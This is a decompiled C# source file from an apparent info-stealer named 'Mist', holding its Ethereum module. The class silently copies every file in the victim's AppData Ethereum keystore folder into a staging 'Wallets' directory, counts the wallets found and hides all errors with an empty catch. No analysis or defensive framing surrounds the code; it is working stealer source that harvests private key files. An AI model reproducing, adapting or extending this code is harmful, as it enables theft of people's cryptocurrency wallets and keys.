using System;
using System.IO;

namespace Mist
{
	// Token: 0x0200006A RID: 106
	internal class Ethereum
	{
		// Token: 0x06000291 RID: 657 RVA: 0x000126EC File Offset: 0x000108EC
		public static void EcoinStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Ethereum.EthereumDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Ethereum.EthereumDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + Ethereum.EthereumDir);
						fileInfo.CopyTo(directorypath + Ethereum.EthereumDir + fileInfo.Name);
					}
					Ethereum.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000161 RID: 353
		public static int count = 0;

		// Token: 0x04000162 RID: 354
		public static string EthereumDir = "\\Wallets\\Ethereum\\";

		// Token: 0x04000163 RID: 355
		public static string EthereumDir2 = Help.AppDate + "\\Ethereum\\keystore";
	}
}
